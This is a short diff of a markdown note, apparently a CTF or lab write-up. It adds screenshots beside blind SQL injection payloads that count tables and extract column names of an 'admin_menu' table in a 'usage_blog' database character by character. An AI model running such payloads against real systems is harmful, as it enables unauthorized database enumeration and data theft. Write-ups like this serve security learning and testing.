@@ -143,9 +143,12 @@ Database name: `usage_blog`
 >[!example]- Result
 >![[Pasted image 20250320184858.png]]
 
+![[Pasted image 20250321222758.png]]
+
 >[!info]- Check the number of result of a request, for example, the number of tables
 >```sql
 >1' or (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='usage_blog')=15 -- -
 >```
 
 - Now getting the name of the column of a table, `1' OR SUBSTRING( (SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'usage_blog' AND TABLE_NAME = 'admin_menu' ), 1, 1 ) = 'a' -- -`
+![[Pasted image 20250321222729.png]]
